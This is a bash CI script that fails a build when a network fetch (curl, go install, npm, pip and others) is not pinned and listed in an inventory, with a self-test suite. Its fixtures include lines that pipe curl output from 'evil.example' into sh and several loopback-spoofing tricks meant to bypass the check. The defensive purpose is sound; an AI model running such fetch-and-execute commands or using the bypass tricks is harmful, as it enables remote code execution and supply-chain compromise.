#!/usr/bin/env bash
# Fail when a build-time network fetch appears that is not in the inventory.
#
# A "fetch" is a command in a workflow, composite action, Makefile, *.mk,
# shell script (*.sh, *.bash) or Dockerfile that runs one of: curl, wget,
# go install, go get, npm/pnpm/yarn install|ci|add, npx, pip/pipx/uv, cargo
# install, gem install, git clone, docker pull, xcaddy build, or a Dockerfile
# `ADD <url>`. Backslash-continued lines are joined first, so a split command
# is still seen.
#
# The inventory, scripts/ci/build-fetches.allow, has one line per fetch:
#   <path> TAB <tool> TAB <fingerprint> TAB <snippet>
# The fingerprint is the first 12 hex of sha256 over the whitespace-normalised
# command text from the tool name to the end of the (joined) line. It is keyed
# by file, tool and content, never by line number, so moving a line does not
# matter but adding a fetch, changing a URL or version, or appending `| sh`
# to a listed fetch does. Identical lines count separately (multiset). The
# snippet is for humans and is not compared. Each listed file must also appear
# in docs/security/BUILD-SUPPLY-CHAIN.md, which says how each fetch is pinned.
#
# Never allowed, even if listed: a floating `@latest`, `go install` with a
# version that is a bare variable (possible @latest), and a project-level
# `npm install` (use `npm ci`; `npm install -g <pkg>@<ver>` is a normal listed
# fetch).
#
# A line is exempt only if it names at least one URL and every URL host is
# exactly localhost, 127.0.0.1 or [::1] (a trailing comment or a host such as
# localhost.example does not qualify). Comment lines are ignored.
#
# Not scanned: scripts/ci/testdata, this script, markdown, and trees that are
# install-time or non-product (hacks/, benchmark/, examples/, terraform/,
# experimental/), plus YAML outside .github/. The doc lists them.
#
# Usage:
#   scripts/ci/check-build-fetches.sh              # check the repo
#   scripts/ci/check-build-fetches.sh --list       # print current inventory lines
#   scripts/ci/check-build-fetches.sh --self-test  # seeded fixtures must fail
# Env (used by the self-test): ROOT, ALLOW, DOC.
set -euo pipefail

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
REPO=$(cd "$HERE/../.." && pwd)

# NUL-separated files in scope (relative-path exclusions applied by in_scope).
files() {
  find "$1" \( -path '*/node_modules' -o -path '*/.git' \) -prune -o -type f \
    \( \( \( -name '*.yml' -o -name '*.yaml' \) -path '*/.github/*' \) \
       -o -name '*.sh' -o -name '*.bash' -o -name '*.mk' -o -name Makefile \
       -o -name 'Dockerfile*' \) -print0 | sort -z
}
in_scope() {
  case "$1" in
    scripts/ci/testdata/*|scripts/ci/check-build-fetches.sh) return 1 ;;
    hacks/*|benchmark/*|examples/*|terraform/*|experimental/*) return 1 ;;
  esac
}

# awk program: for one file prints
#   T<TAB>tool<TAB>normalised-segment    for each fetch
#   F<TAB>lineno<TAB>reason<TAB>text      for each forbidden construct
AWK='
function loopback_only(line,   rest, n, u, host) {
  n = 0; rest = line
  while (match(rest, /[A-Za-z][A-Za-z0-9+.-]*:\/\/[^ \t"'"'"')\\|;&]*/)) {
    u = substr(rest, RSTART, RLENGTH); rest = substr(rest, RSTART + RLENGTH)
    sub(/^[^:]*:\/\//, "", u); sub(/^[^@\/]*@/, "", u)
    if (u ~ /^\[/) { host = u; sub(/\].*$/, "]", host) } else { host = u; sub(/[:\/?#].*$/, "", host) }
    if (host != "localhost" && host != "127.0.0.1" && host != "[::1]") return 0
    n++
  }
  return n > 0
}
function seg(line, re,   s) {
  if (!match(line, re)) return ""
  s = substr(line, RSTART)
  if (s !~ /^[A-Za-z]/) s = substr(s, 2)
  gsub(/[ \t]+/, " ", s); sub(/ $/, "", s)
  return s
}
BEGIN {
  W = "(^|[^A-Za-z0-9_.-])"; T = "([ \t]|$)"
  n = split("curl|wget|go install|go get|npm install|npm ci|pip install|pipx|uv|npx|git clone|docker pull|cargo install|gem install|xcaddy build|ADD url", names, "|")
  re["curl"] = W "curl" T
  re["wget"] = W "wget" T
  re["go install"] = W "go[ \t]+install" T
  re["go get"] = W "go[ \t]+get" T
  re["npm install"] = W "(npm|pnpm|yarn)[ \t]+(install|i|add)" T
  re["npm ci"] = W "npm[ \t]+ci" T
  re["pip install"] = W "pip3?[ \t]+install" T
  re["pipx"] = W "pipx[ \t]+(install|run|inject)" T
  re["uv"] = W "uv[ \t]+(pip|tool|run|add|sync)" T
  re["npx"] = W "npx" T
  re["git clone"] = W "git[ \t]+clone" T
  re["docker pull"] = W "docker[ \t]+pull" T
  re["cargo install"] = W "cargo[ \t]+install" T
  re["gem install"] = W "gem[ \t]+install" T
  re["xcaddy build"] = W "xcaddy\"?[ \t]+build" T
  re["ADD url"] = "^[ \t]*ADD[ \t]+(--[^ \t]+[ \t]+)*https?://"
}
{
  if ($0 ~ /^[ \t]*#/) next
  start = NR; line = $0
  while (line ~ /\\$/ && (getline nxt) > 0) { sub(/\\$/, "", line); line = line nxt }
  if (line ~ /@latest([^A-Za-z0-9_]|$)/) print "F\t" start "\t@latest\t" line
  if (line ~ /go[ \t]+install[^|;&]*@\$/) print "F\t" start "\tgo install with a variable version (possible @latest)\t" line
  if (line ~ W "npm[ \t]+(install|i)" T && line !~ /[ \t](-g|--global)([ \t]|$)/) print "F\t" start "\tnpm install (use npm ci)\t" line
  if (loopback_only(line)) next
  for (i = 1; i <= n; i++) {
    s = seg(line, re[names[i]])
    if (s != "") print "T\t" names[i] "\t" s
  }
}'

fp() {
  local out
  if command -v sha256sum >/dev/null; then out=$(printf '%s' "$1" | sha256sum); else out=$(printf '%s' "$1" | shasum -a 256); fi
  echo "${out:0:12}"
}

# inventory <root>: sorted "path<TAB>tool<TAB>fp<TAB>snippet" for every fetch;
# forbidden <root>: "path:line: reason: text".
run_scan() {
  local root=$1 mode=$2 file rel kind a b c
  while IFS= read -r -d '' file; do
    rel=${file#"$root"/}
    in_scope "$rel" || continue
    while IFS=$'\t' read -r kind a b c; do
      if [[ "$mode" == inventory && "$kind" == T ]]; then
        printf '%s\t%s\t%s\t%s\n' "$rel" "$a" "$(fp "$b")" "${b:0:70}"
      elif [[ "$mode" == forbidden && "$kind" == F ]]; then
        printf '%s:%s: %s: %s\n' "$rel" "$a" "$b" "$c"
      fi
    done < <(awk "$AWK" "$file")
  done < <(files "$root")
}

keys() { cut -f1-3 | sort; }   # multiset key: path, tool, fingerprint

check() {
  local root=$1 allow=$2 doc=$3 bad=0 forb found listed path rest line
  forb=$(run_scan "$root" forbidden)
  if [[ -n "$forb" ]]; then
    while IFS= read -r line; do echo "FORBIDDEN: $line"; done <<<"$forb"
    bad=1
  fi
  found=$(run_scan "$root" inventory)
  listed=$(grep -vE '^[[:space:]]*(#|$)' "$allow" || true)
  # in the tree but not accounted for (a new, changed or duplicated fetch)
  while IFS= read -r line; do
    [[ -n "$line" ]] || continue
    echo "UNLISTED FETCH: $(cut -f1,2 <<<"$line") :: $(cut -f4 <<<"$line")"
    bad=1
  done < <(comm -23 <(keys <<<"$found") <(keys <<<"$listed") | while IFS=$'\t' read -r p t f; do
             grep -F "$p"$'\t'"$t"$'\t'"$f" <<<"$found" | head -1; done)
  # listed but no longer in the tree
  while IFS= read -r line; do
    [[ -n "$line" ]] || continue
    echo "STALE ENTRY: $(cut -f1,2 <<<"$line") :: $(cut -f4 <<<"$line") (no longer in the tree; remove or update it)"
    bad=1
  done < <(comm -13 <(keys <<<"$found") <(keys <<<"$listed") | while IFS=$'\t' read -r p t f; do
             grep -F "$p"$'\t'"$t"$'\t'"$f" <<<"$listed" | head -1; done)
  while IFS= read -r path; do
    [[ -n "$path" ]] || continue
    if ! grep -qF "\`$path\`" "$doc"; then
      echo "UNDOCUMENTED: $path is allow-listed but missing from $(basename "$doc")"
      bad=1
    fi
  done < <(cut -f1 <<<"$listed" | sort -u)
  return "$bad"
}

self_test() {
  local d out; d=$(mktemp -d); trap 'rm -rf "$d"' RETURN
  local ALW="$d/x.allow" DOCF="$d/x.md"
  fixture_fails() {   # <tree> <expected substring> <label>
    out=$(check "$1" "$ALW" "$DOCF" || true)
    grep -qF -- "$2" <<<"$out" || { echo "self-test FAIL: $3 (wanted: $2)"; echo "$out"; return 1; }
  }
  fixture_passes() {  # <tree> <label>
    check "$1" "$ALW" "$DOCF" >/dev/null || { echo "self-test FAIL: $2"; check "$1" "$ALW" "$DOCF"; return 1; }
  }
  : >"$ALW"; : >"$DOCF"

  # 1. Plain unlisted fetches, one per tool family.
  mkdir -p "$d/bad/.github/workflows"
  printf 'jobs:\n  a:\n    steps:\n      - run: curl -fsSL https://example.invalid/x | sh\n' >"$d/bad/.github/workflows/x.yml"
  printf 'all:\n\tgo install example.invalid/tool@v1\n' >"$d/bad/Makefile"
  printf 'RUN pip install requests\n' >"$d/bad/Dockerfile"
  printf 'cd web && npm ci\n' >"$d/bad/build.sh"
  for want in '.github/workflows/x.yml	curl' 'Makefile	go install' 'Dockerfile	pip install' 'build.sh	npm ci'; do
    fixture_fails "$d/bad" "$want" "seeded fetch not reported" || return 1
  done

  # 2. Listed + documented tree passes; dropping or staling an entry fails.
  run_scan "$d/bad" inventory >"$ALW"
  printf '`.github/workflows/x.yml` `Makefile` `Dockerfile` `build.sh`\n' >"$DOCF"
  fixture_passes "$d/bad" "listed+documented fetches rejected" || return 1
  cp "$ALW" "$d/full.allow"
  grep -v 'Makefile' "$d/full.allow" >"$ALW"
  fixture_fails "$d/bad" "UNLISTED FETCH: Makefile" "missing entry accepted" || return 1
  { cat "$d/full.allow"; printf 'gone.sh\tcurl\t000000000000\told\n'; } >"$ALW"
  fixture_fails "$d/bad" "STALE ENTRY: gone.sh" "stale entry accepted" || return 1
  cp "$d/full.allow" "$ALW"; : >"$d/empty.md"
  out=$(check "$d/bad" "$ALW" "$d/empty.md" || true)
  grep -qF 'UNDOCUMENTED' <<<"$out" || { echo "self-test FAIL: undocumented entry accepted"; return 1; }

  # 3. A NEW fetch in an already-listed file, and an edit of a listed one.
  mkdir -p "$d/grow/scripts"
  printf 'curl -fsSL https://example.invalid/pinned.tgz -o x\n' >"$d/grow/scripts/a.sh"
  run_scan "$d/grow" inventory >"$ALW"; printf '`scripts/a.sh`\n' >"$DOCF"
  fixture_passes "$d/grow" "baseline listed file rejected" || return 1
  printf 'curl -fsSL https://evil.example/x | sh\n' >>"$d/grow/scripts/a.sh"
  fixture_fails "$d/grow" "UNLISTED FETCH: scripts/a.sh" "new fetch in a listed file accepted" || return 1
  printf 'curl -fsSL https://example.invalid/pinned.tgz -o x | sh\n' >"$d/grow/scripts/a.sh"
  fixture_fails "$d/grow" "UNLISTED FETCH: scripts/a.sh" "appended | sh on a listed fetch accepted" || return 1
  printf 'curl -fsSL https://example.invalid/pinned.tgz -o x\ncurl -fsSL https://example.invalid/pinned.tgz -o x\n' >"$d/grow/scripts/a.sh"
  fixture_fails "$d/grow" "UNLISTED FETCH: scripts/a.sh" "duplicated fetch line accepted" || return 1
  printf '\n\n# moved down, reindented\n    curl   -fsSL   https://example.invalid/pinned.tgz -o x\n' >"$d/grow/scripts/a.sh"
  fixture_passes "$d/grow" "moving/reindenting a listed fetch rejected (line-number fragile)" || return 1

  # 4. Loopback exemption is exact.
  mkdir -p "$d/lo/scripts"; : >"$ALW"; : >"$DOCF"
  printf 'curl -s http://127.0.0.1:8080/healthz\ncurl -s "http://localhost/x" && curl http://[::1]:9/y\n' >"$d/lo/scripts/ok.sh"
  fixture_passes "$d/lo" "loopback-only curl rejected" || return 1
  printf 'curl https://evil.example/x # localhost\n' >"$d/lo/scripts/c1.sh"
  fixture_fails "$d/lo" "scripts/c1.sh	curl" "trailing '# localhost' comment exempted a fetch" || return 1
  rm "$d/lo/scripts/c1.sh"
  printf 'curl http://localhost.evil.example/y\n' >"$d/lo/scripts/c2.sh"
  fixture_fails "$d/lo" "scripts/c2.sh	curl" "localhost.evil.example exempted" || return 1
  rm "$d/lo/scripts/c2.sh"
  printf 'curl -s http://localhost/x && curl https://evil.example/z\n' >"$d/lo/scripts/c3.sh"
  fixture_fails "$d/lo" "scripts/c3.sh	curl" "mixed loopback+remote line exempted" || return 1
  rm "$d/lo/scripts/c3.sh"
  printf 'curl http://127.0.0.1@evil.example/y\n' >"$d/lo/scripts/c4.sh"
  fixture_fails "$d/lo" "scripts/c4.sh	curl" "userinfo host trick exempted" || return 1

  # 5. Coverage of other fetch shapes.
  mkdir -p "$d/cov/ci"; : >"$ALW"
  printf 'FROM scratch\nADD https://example.invalid/x.tgz /x\n' >"$d/cov/Dockerfile"
  printf 'git clone https://example.invalid/r.git\n' >"$d/cov/ci/clone.sh"
  printf 'npx some-tool@1\n' >"$d/cov/ci/npx.sh"
  printf 'docker pull example.invalid/img:1\n' >"$d/cov/ci/dock.sh"
  printf 'pipx install tool\nuv pip install tool\n' >"$d/cov/ci/py.sh"
  printf 'cargo install tool\ngem install tool\n' >"$d/cov/ci/lang.sh"
  printf 'curl https://example.invalid/b\n' >"$d/cov/ci/run.bash"
  printf 'x:\n\tcurl https://example.invalid/m\n' >"$d/cov/ci/rules.mk"
  printf 'curl -fsSL \\\n  https://example.invalid/split\n' >"$d/cov/ci/split.sh"
  printf 'cur\\\nl https://example.invalid/split2\n' >"$d/cov/ci/split2.sh"
  printf 'xcaddy build --with example.invalid/mod\n' >"$d/cov/ci/xc.sh"
  printf '"$TMP/xcaddy" build\n$(go env GOPATH)/bin/xcaddy build v2\n' >"$d/cov/ci/xc2.sh"
  printf 'GOBIN=/usr/local/bin /usr/local/go/bin/go install example.invalid/t@v1\n' >"$d/cov/ci/gopath.sh"
  for want in 'Dockerfile	ADD url' 'ci/clone.sh	git clone' 'ci/npx.sh	npx' 'ci/dock.sh	docker pull' 'ci/py.sh	pipx' 'ci/py.sh	uv' \
              'ci/lang.sh	cargo install' 'ci/lang.sh	gem install' 'ci/run.bash	curl' 'ci/rules.mk	curl' 'ci/split.sh	curl' 'ci/split2.sh	curl' 'ci/xc.sh	xcaddy build' 'ci/xc2.sh	xcaddy build' 'ci/gopath.sh	go install'; do
    fixture_fails "$d/cov" "$want" "undetected fetch shape" || return 1
  done

  # 6. Forbidden constructs fail even when listed.
  mkdir -p "$d/forb"
  printf 'cd web && npm install\n' >"$d/forb/a.sh"
  printf 'go install example.invalid/tool@latest\n' >"$d/forb/b.sh"
  printf 'go install example.invalid/tool@${TOOL_VERSION}\n' >"$d/forb/d.sh"
  printf 'npm install -g pnpm@9\n# npm install in a comment\n' >"$d/forb/c.sh"
  run_scan "$d/forb" inventory >"$ALW"; printf '`a.sh` `b.sh` `c.sh` `d.sh`\n' >"$DOCF"
  fixture_fails "$d/forb" 'a.sh:1: npm install' "npm install not forbidden" || return 1
  fixture_fails "$d/forb" 'b.sh:1: @latest' "@latest not forbidden" || return 1
  fixture_fails "$d/forb" 'd.sh:1: go install with a variable version' "variable go install version not flagged" || return 1
  out=$(check "$d/forb" "$ALW" "$DOCF" || true)
  if grep -qF 'c.sh:' <<<"$out"; then echo "self-test FAIL: pinned global npm install / comment flagged"; echo "$out"; return 1; fi

  # 7. Early hit in a large file (guards grep -q SIGPIPE under pipefail).
  mkdir -p "$d/big"; : >"$ALW"; : >"$DOCF"
  { printf 'curl -fsSL https://example.invalid/y\n'; seq 1 60000; } >"$d/big/big.sh"
  fixture_fails "$d/big" "big.sh	curl" "early fetch in large file missed" || return 1
  echo "self-test ok: new/changed/duplicated fetches in listed files, loopback bypasses, and extra fetch shapes all rejected; moves accepted"
}

case "${1:-}" in
  --self-test) self_test; exit ;;
  --list) run_scan "${ROOT:-$REPO}" inventory; exit ;;
esac
ROOT=${ROOT:-$REPO}
ALLOW=${ALLOW:-$REPO/scripts/ci/build-fetches.allow}
DOC=${DOC:-$REPO/docs/security/BUILD-SUPPLY-CHAIN.md}
if check "$ROOT" "$ALLOW" "$DOC"; then echo "build-time fetch inventory is complete"; else
  echo "Every build-time fetch must be pinned (version + checksum) and listed in $ALLOW and $DOC (regenerate lines with: scripts/ci/check-build-fetches.sh --list)." >&2
  exit 1
fi
